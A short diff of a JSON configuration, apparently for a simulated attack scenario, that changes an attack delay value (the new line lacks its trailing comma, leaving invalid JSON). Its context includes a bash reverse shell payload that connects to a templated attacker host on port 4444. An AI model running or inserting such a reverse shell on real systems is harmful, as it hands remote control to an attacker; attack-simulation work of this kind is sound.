@@ -16,7 +16,7 @@
               "attacker_ip": "shell-attacker-${ deployment }.${ dynu_dns_domain }",
               "target_port": 8080,
               "payload": "/bin/bash -c \"TASK=iam2rds /bin/bash -i >& /dev/tcp/shell-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
-              "attack_delay": 93600,
+              "attack_delay": 50400
               "reverse_shell_port": 4444
             },
             "generate_web_traffic": {
